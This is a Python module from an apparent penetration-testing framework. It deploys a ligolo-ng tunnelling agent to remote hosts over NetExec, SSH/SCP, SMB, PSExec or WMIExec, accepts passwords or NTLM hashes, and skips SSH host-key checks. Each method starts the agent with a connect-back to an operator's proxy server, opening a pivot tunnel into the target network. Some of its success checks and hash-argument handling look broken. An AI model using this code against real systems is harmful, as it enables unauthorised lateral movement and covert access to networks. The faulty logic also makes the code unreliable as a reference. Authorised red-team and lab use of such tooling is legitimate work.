"""
Ligolo Pivot Deployment Module

Deploy ligolo-ng agents to target systems for network pivoting.
Supports multiple deployment methods: NXC, SSH, SMB, PSExec, WMIExec.
"""

from purplesploit.core.module import BaseModule
import subprocess
from pathlib import Path
from typing import Dict, Any, List


class LigoloDeployModule(BaseModule):
    """
    Ligolo Pivot Deployment - Deploy ligolo-ng agents for network pivoting.

    Deploys the ligolo-ng agent to target systems using various methods
    based on available access and target OS.
    """

    def __init__(self, framework):
        super().__init__(framework)

    @property
    def name(self) -> str:
        return "Ligolo Pivot Deploy"

    @property
    def description(self) -> str:
        return "Deploy ligolo-ng agents to targets for network pivoting"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "deploy"

    def get_operations(self) -> List[Dict[str, Any]]:
        """Return list of Ligolo deployment operations."""
        return [
            {
                "name": "Deploy via NXC",
                "description": "Deploy ligolo-ng agent using NetExec (NXC) - Windows targets",
                "handler": self.deploy_via_nxc
            },
            {
                "name": "Deploy via SSH",
                "description": "Deploy ligolo-ng agent via SSH - Linux/Unix targets",
                "handler": self.deploy_via_ssh
            },
            {
                "name": "Deploy via SMB",
                "description": "Deploy ligolo-ng agent via SMB share upload - Windows targets",
                "handler": self.deploy_via_smb
            },
            {
                "name": "Deploy via PSExec",
                "description": "Deploy ligolo-ng agent using Impacket PSExec - Windows targets",
                "handler": self.deploy_via_psexec
            },
            {
                "name": "Deploy via WMIExec",
                "description": "Deploy ligolo-ng agent using Impacket WMIExec - Windows targets",
                "handler": self.deploy_via_wmiexec
            },
        ]

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target host IP address",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": False,
                "description": "Username for authentication",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authentication",
                "default": None
            },
            "DOMAIN": {
                "value": "",
                "required": False,
                "description": "Domain for Windows authentication",
                "default": ""
            },
            "HASH": {
                "value": None,
                "required": False,
                "description": "NTLM hash for authentication",
                "default": None
            },
            "SSH_KEY": {
                "value": None,
                "required": False,
                "description": "SSH private key path (for SSH deployment)",
                "default": None
            },
            "LOCAL_FILE": {
                "value": None,
                "required": True,
                "description": "Path to ligolo-ng agent binary",
                "default": None
            },
            "LIGOLO_SERVER": {
                "value": "127.0.0.1:11601",
                "required": False,
                "description": "Ligolo-ng proxy server address (IP:PORT)",
                "default": "127.0.0.1:11601"
            },
            "TARGET_OS": {
                "value": "windows",
                "required": False,
                "description": "Target OS (windows, linux)",
                "default": "windows"
            }
        })

    def deploy_via_nxc(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via NetExec (NXC)."""
        self.log("Deploying Ligolo agent via NetExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # Build NXC command for upload
            remote_path = "C:\\Windows\\Temp\\ligolo-agent.exe"
            cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                cmd.extend(["-d", domain])

            if hash_val:
                cmd.extend(["-H", hash_val])
            elif password:
                cmd.extend(["-p", password])
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Upload file
            cmd.extend(["--put-file", local_file, remote_path])

            self.log(f"Uploading Ligolo agent to {rhost}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            # Execute agent
            exec_cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                exec_cmd.extend(["-d", domain])

            if hash_val:
                exec_cmd.extend(["-H", hash_val])
            else:
                exec_cmd.extend(["-p", password])

            exec_cmd.extend(["-x", f"{remote_path} -connect {ligolo_server} -ignore-cert"])

            self.log("Executing Ligolo agent...")
            exec_result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=60)

            self.log("Ligolo agent deployed successfully", "success")
            return {
                "success": True,
                "output": exec_result.stdout,
                "method": "nxc",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"NXC deployment failed: {str(e)}"
            }

    def deploy_via_ssh(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via SSH."""
        self.log("Deploying Ligolo agent via SSH...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            remote_path = "/tmp/ligolo-agent"

            # Upload via SCP
            if ssh_key:
                scp_cmd = [
                    "scp", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]
            else:
                scp_cmd = [
                    "sshpass", "-p", password,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    local_file,
                    f"{username}@{rhost}:{remote_path}"
                ]

            self.log(f"Uploading agent to {rhost}...")
            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Upload failed: {result.stderr}"
                }

            # Execute agent
            if ssh_key:
                ssh_cmd = [
                    "ssh", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
                ]
            else:
                ssh_cmd = [
                    "sshpass", "-p", password,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
                ]

            self.log("Executing agent...")
            exec_result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=60)

            self.log("Ligolo agent deployed successfully", "success")
            return {
                "success": True,
                "output": exec_result.stdout,
                "method": "ssh",
                "remote_path": remote_path
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"SSH deployment failed: {str(e)}"
            }

    def deploy_via_smb(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via SMB."""
        self.log("Deploying Ligolo agent via SMB...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, password, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, LOCAL_FILE"
            }

        try:
            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, "ligolo-agent.exe"
            )

            if not upload_result["success"]:
                return upload_result

            # Execute via WMI
            exec_result = self._execute_via_wmi(
                rhost, username, password, domain, None,
                upload_result["remote_path"],
                f"-connect {ligolo_server} -ignore-cert"
            )

            if exec_result["success"]:
                self.log("Ligolo agent deployed successfully", "success")

            return exec_result

        except Exception as e:
            return {
                "success": False,
                "error": f"SMB deployment failed: {str(e)}"
            }

    def deploy_via_psexec(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via PSExec."""
        self.log("Deploying Ligolo agent via PSExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # Build auth string
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                auth += f"@{rhost} -hashes :{hash_val}"
            elif password:
                auth += f":{password}@{rhost}"
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Execute via PSExec with file copy
            cmd = [
                "impacket-psexec",
                auth,
                "-c", local_file,
                f"ligolo-agent.exe -connect {ligolo_server} -ignore-cert"
            ]

            self.log("Deploying via PSExec...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

            if "Impacket" in result.stdout or result.returncode == 0:
                self.log("Ligolo agent deployed successfully", "success")
                return {
                    "success": True,
                    "output": result.stdout,
                    "method": "psexec"
                }
            else:
                return {
                    "success": False,
                    "error": f"PSExec failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"PSExec deployment failed: {str(e)}"
            }

    def deploy_via_wmiexec(self) -> Dict[str, Any]:
        """Deploy ligolo-ng agent via WMIExec."""
        self.log("Deploying Ligolo agent via WMIExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        local_file = self.get_option("LOCAL_FILE")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, local_file]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, LOCAL_FILE"
            }

        try:
            # Upload via SMB
            upload_result = self._upload_via_smb(
                rhost, username, password, domain, local_file, "ligolo-agent.exe"
            )

            if not upload_result["success"]:
                return upload_result

            # Execute via WMI
            exec_result = self._execute_via_wmi(
                rhost, username, password, domain, hash_val,
                upload_result["remote_path"],
                f"-connect {ligolo_server} -ignore-cert"
            )

            if exec_result["success"]:
                self.log("Ligolo agent deployed successfully", "success")

            return exec_result

        except Exception as e:
            return {
                "success": False,
                "error": f"WMIExec deployment failed: {str(e)}"
            }

    def _upload_via_smb(self, rhost: str, username: str, password: str,
                        domain: str, local_file: str, remote_filename: str) -> Dict[str, Any]:
        """Helper method to upload file via SMB."""
        share = "C$"
        remote_path = f"Windows\\Temp\\{remote_filename}"
        full_remote_path = f"C:\\{remote_path}"

        auth_user = f"{domain}/{username}" if domain else username
        auth_string = f"{auth_user}%{password}"

        cmd = [
            "smbclient",
            f"//{rhost}/{share}",
            "-U", auth_string,
            "-c", f"put {local_file} {remote_path}"
        ]

        self.log(f"Uploading via SMB to {rhost}...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        if result.returncode == 0:
            self.log("Upload successful", "success")
            return {
                "success": True,
                "remote_path": full_remote_path,
                "method": "smb"
            }
        else:
            return {
                "success": False,
                "error": f"SMB upload failed: {result.stderr}"
            }

    def _execute_via_wmi(self, rhost: str, username: str, password: str,
                         domain: str, hash_val: str, remote_path: str,
                         args: str) -> Dict[str, Any]:
        """Helper method to execute file via WMI."""
        auth = f"{domain}/{username}" if domain else username

        if hash_val:
            auth += f"@{rhost} -hashes :{hash_val}"
        elif password:
            auth += f":{password}@{rhost}"
        else:
            return {"success": False, "error": "No PASSWORD or HASH provided"}

        exec_command = f"{remote_path} {args}".strip()

        cmd = [
            "impacket-wmiexec",
            auth,
            exec_command
        ]

        self.log("Executing via WMI...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode == 0 or "Impacket" in result.stdout:
            self.log("Execution successful", "success")
            return {
                "success": True,
                "output": result.stdout,
                "method": "wmiexec"
            }
        else:
            return {
                "success": False,
                "error": f"WMI execution failed: {result.stderr}"
            }

    def run(self) -> Dict[str, Any]:
        """Run the module."""
        return {
            "success": True,
            "message": "Select a deployment operation to continue"
        }
